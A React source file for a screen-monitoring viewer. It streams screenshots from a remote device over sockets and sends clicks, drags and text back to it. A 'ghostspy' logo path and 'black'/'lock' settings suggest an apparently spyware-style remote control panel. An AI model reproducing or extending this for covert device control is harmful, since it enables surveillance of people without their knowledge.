import React, { useEffect, useState, useRef } from "react";
import { Grid, CircularProgress, CardMedia, Box, TextField } from "@mui/material";
import { useTranslation } from "react-i18next";
import { useDrag } from "react-use-gesture";

import MenuIcon from "@mui/icons-material/Menu";
import { IconButton } from "@mui/material";
import SendOutlinedIcon from "@mui/icons-material/SendOutlined";

import { useSocket } from "../../hooks/use-socket";
import { useSocketFunctions } from "../../utils/socket";
import { SocketIOPublicEvents } from "../../sections/settings/setting-socket";
import ScreenToolbar from "./screenTools";
import MonitorViewer from "../monitorViewer";

import Color from "src/theme/colors";

const ScreenMonitorViewer = ({ monitor, device, onClose }) => {
  const { t } = useTranslation();
  const {
    onSocketMonitor,
    onScreenClickEvent,
    onScreenDragEvent,
    onSocketCloseMonitor,
    onSendTextEvent,
  } = useSocketFunctions();
  const { socket } = useSocket();
  const imageRef = useRef(null);

  const [state, setState] = useState({
    width: 360,
    height: 720,
    x: 100,
    y: -120,
    minWidth: 180,
    minHeight: 360,
    maxWidth: 360,
    maxHeight: 720,
  });

  const [screenCode, setScreenCode] = useState(null);
  const [changeLoading, setChangeLoading] = useState(false);
  const [hovered, setHovered] = useState(false);
  const [positions, setPositions] = useState([]);
  const [isDragging, setIsDragging] = useState(false);
  const [mouseDown, setMouseDown] = useState(false);
  const [messageOpen, setmessageOpen] = useState(false);
  const [message, setMessage] = useState(null);

  const black = localStorage.getItem("black");
  const lock = localStorage.getItem("lock");

  useEffect(() => {
    const deviceId = device?.deviceId;
    let isMounted = true;

    const monitorDevice = async () => {
      try {
        if (deviceId) {
          setChangeLoading(true);
          await onSocketMonitor(monitor, { deviceId });

          const handleMonitorResponse = (data) => {
            if (isMounted && monitor === data.type) {
              const base64Image = data.response?.base64Image;
              setScreenCode(base64Image);
              setChangeLoading(false);
              setmessageOpen(true);
            }
          };

          socket.on(`screen-shared-${deviceId}`, handleMonitorResponse);

          return () => {
            socket.off(`screen-shared-${deviceId}`, handleMonitorResponse);
            isMounted = false;
          };
        }
      } catch (error) {
        console.error("Error monitoring device:", error);
      }
    };

    monitorDevice();
  }, [monitor]);

  // send screen text
  const onSendInputText = async () => {
    setmessageOpen(false);
    try {
      const deviceId = device?.deviceId;

      await onSendTextEvent(SocketIOPublicEvents.screen_send_text_event, {
        deviceId,
        message,
      });
    } catch (error) {
      console.log("send text error", error);
    }
  };

  // Close
  const onCloseModal = async () => {
    try {
      setScreenCode(null);
      onClose(false);
    } catch (error) {
      console.log("close monitor modal error", error);
    }
  };

  // Prevent drag on image
  const preventDrag = (e) => {
    e.stopPropagation();
  };

  // Handle resizing
  const handleResizeStop = (e, direction, ref, delta, position) => {
    setState((prevState) => ({
      ...prevState,
      width: parseInt(ref.style.width, 10),
      height: parseInt(ref.style.height, 10),
      ...position,
    }));
  };

  // Handle image load to get intrinsic and rendered size
  const onImageLoad = (e) => {
    const img = e.target;
    const intrinsicWidth = img.naturalWidth;
    const intrinsicHeight = img.naturalHeight;
    const initialWidth = Math.round(intrinsicWidth); // Scale down if necessary
    const initialHeight = Math.round(intrinsicHeight); // Scale down if necessary
    const minWidth = Math.round(intrinsicWidth * 0.5);
    const minHeight = Math.round(intrinsicHeight * 0.5);
    const maxWidth = intrinsicWidth;
    const maxHeight = intrinsicHeight;

    setState((prevState) => ({
      ...prevState,
      width: initialWidth,
      height: initialHeight,
      minWidth,
      minHeight,
      maxWidth,
      maxHeight,
    }));
  };

  const calculatePosition = async (clientX, clientY) => {
    try {
      const img = imageRef.current;
      if (img) {
        const rect = img.getBoundingClientRect();
        const x = clientX - rect.left;
        const y = clientY - rect.top;

        const intrinsicWidth = img.naturalWidth;
        const intrinsicHeight = img.naturalHeight;

        const renderedWidth = rect.width;
        const renderedHeight = rect.height;

        const xRate = intrinsicWidth / renderedWidth;
        const yRate = intrinsicHeight / renderedHeight;

        let xPosition = x * xRate;
        let yPosition = y * yRate;

        xPosition = parseFloat(xPosition.toFixed(6));
        yPosition = parseFloat(yPosition.toFixed(6));

        return { xPosition, yPosition };
      } else {
        console.error("Image reference is null.");
      }
    } catch (error) {
      console.error("Error in calculatePosition:", error);
    }

    // Fallback return value to avoid undefined errors
    return { xPosition: 0, yPosition: 0 };
  };

  // Handle drag
  const bind = useDrag(async ({ event, memo = { startX: 0, startY: 0 }, movement: [mx, my] }) => {
    const deviceId = device?.deviceId;

    if (event.type === "pointerdown") {
      setPositions([]);
      setMouseDown(true);
      setIsDragging(false);
      memo.startX = event.clientX;
      memo.startY = event.clientY;
    } else if (event.type === "pointermove") {
      if (mouseDown) {
        setIsDragging(true);
        const { xPosition, yPosition } =
          (await calculatePosition(event.clientX, event.clientY)) || {};
        if (xPosition >= 0 && yPosition >= 0) {
          setPositions((prevPositions) => [...prevPositions, { x: xPosition, y: yPosition }]);
        }
      }
    } else if (event.type === "pointerup") {
      setMouseDown(false);

      if (positions.length === 0) {
        const { xPosition, yPosition } =
          (await calculatePosition(event.clientX, event.clientY)) || {};
        if (xPosition >= 0 && yPosition >= 0) {
          await onScreenClickEvent(SocketIOPublicEvents.screen_click_event, {
            deviceId,
            xPosition,
            yPosition,
          });
        }
      } else {
        await onScreenDragEvent(SocketIOPublicEvents.screen_drag_event, {
          deviceId,
          positions,
        });
      }

      setIsDragging(false);
    }
    return memo;
  });

  // Open Setting
  const onOpenSetting = async () => {
    setHovered(true);
  };

  return (
    <MonitorViewer
      initialState={{
        width: 360,
        height: 720,
        x: 100,
        y: -120,
        minWidth: 180,
        minHeight: 360,
        maxWidth: 360,
        maxHeight: 720,
      }}
      onClose={onCloseModal}
    >
      {(screenCode != null || screenCode == "") && (
        <div
          style={{
            position: "absolute",
            top: "10px",
            left: "10px",
            cursor: "pointer",
            width: "88%",
            zIndex: "999",
          }}
          onMouseLeave={() => setHovered(false)}
        >
          {/* Toolbar area inside Rnd */}
          <ScreenToolbar visible={hovered} device={device} black={black} lock={lock} />
          <IconButton
            className="modal-close-icon"
            style={{ paddingTop: "0px" }}
            edge="end"
            aria-label="close"
            onClick={() => onOpenSetting()}
            onMouseEnter={() => setHovered(true)}
          >
            <MenuIcon />
          </IconButton>
        </div>
      )}

      <div style={{ position: "relative", width: "100%", height: "100%" }}>
        {/* Your screen monitoring content here */}
        <Grid
          sx={{
            display: "flex",
            flexDirection: "column",
            position: "relative",
            width: "100%",
            height: "100%",
            backgroundColor: "black",
            border: `solid 1px ${Color.background.border}`,
            borderRadius: "5px",
          }}
        >
          {changeLoading && (
            <Grid
              sx={{
                position: "absolute",
                top: 0,
                left: 0,
                right: 0,
                bottom: 0,
                display: "flex",
                flexDirection: "column",
                justifyContent: "center",
                alignItems: "center",
                zIndex: 1,
                color: "white",
                width: "100%",
              }}
            >
              <Grid
                sx={{
                  display: "flex",
                  justifyContent: "center",
                  alignItems: "center",
                  backgroundColor: Color.background.purple,
                  width: "30px",
                  height: "30px",
                  borderRadius: "5px",
                }}
              >
                <CircularProgress sx={{ color: "white" }} size={20} />
              </Grid>
            </Grid>
          )}
          {screenCode != null && !changeLoading && (
            <Grid
              sx={{
                display: "flex",
                justifyContent: "center",
                alignItems: "center",
                width: "100%",
                height: "100%",
                pb: 1,
                position: "relative",
              }}
            >
              <Grid
                onMouseDown={preventDrag}
                onTouchStart={preventDrag}
                sx={{
                  height: "100%",
                  width: "100%",
                  position: "absolute",
                  top: 0,
                  left: 0,
                  zIndex: 2,
                  opacity: 0.5,
                  cursor: "default",
                }}
                // onClick={onPositionEvent}
                {...bind()}
              ></Grid>

              {screenCode ? (
                <CardMedia
                  className="screen-body"
                  component="img"
                  src={`data:image/png;base64, ${screenCode}`}
                  sx={{
                    cursor: "default",
                    width: "100%",
                    height: "100%",
                    borderRadius: "0px",
                    position: "absolute",
                    top: 0,
                    left: 0,
                    zIndex: 1,
                  }}
                  onLoad={onImageLoad}
                  ref={imageRef}
                />
              ) : (
                <CardMedia
                  className="screen-body"
                  component="img"
                  src={"/assets/logos/spy/ghostspy-logo-_2_.webp"}
                  sx={{
                    cursor: "default",
                    width: "auto",
                    height: "auto",
                    borderRadius: "0px",
                  }}
                />
              )}

              {screenCode && (
                <Box
                  onMouseDown={preventDrag}
                  onTouchStart={preventDrag}
                  sx={{
                    position: "absolute",
                    bottom: { md: "-50px", xs: "0px" },
                    width: "100%",
                    zIndex: 99999,
                  }}
                >
                  <Box
                    sx={{
                      display: "flex",
                      alignItems: "center",
                      gap: "10px",
                      position: "relative",
                    }}
                  >
                    <TextField
                      className="screen-message"
                      fullWidth
                      // label={t("devicesPage.monitors.skeleton-input")}
                      value={message?.text || ""}
                      onChange={(e) => setMessage({ ...message, text: e.target.value })}
                      inputProps={{
                        style: {
                          backgroundColor: Color.background.main,
                          padding: "10px 50px 10px 10px",
                        },
                      }}
                    />
                    <SendOutlinedIcon
                      onClick={() => onSendInputText()}
                      sx={{
                        backgroundColor: Color.background.main,
                        position: "absolute",
                        right: "1%",
                        color: Color.text.primary,
                        cursor: "pointer",
                        fontSize: "30px",
                      }}
                    />
                  </Box>
                </Box>
              )}
            </Grid>
          )}
        </Grid>
      </div>
    </MonitorViewer>
  );
};

export default ScreenMonitorViewer;
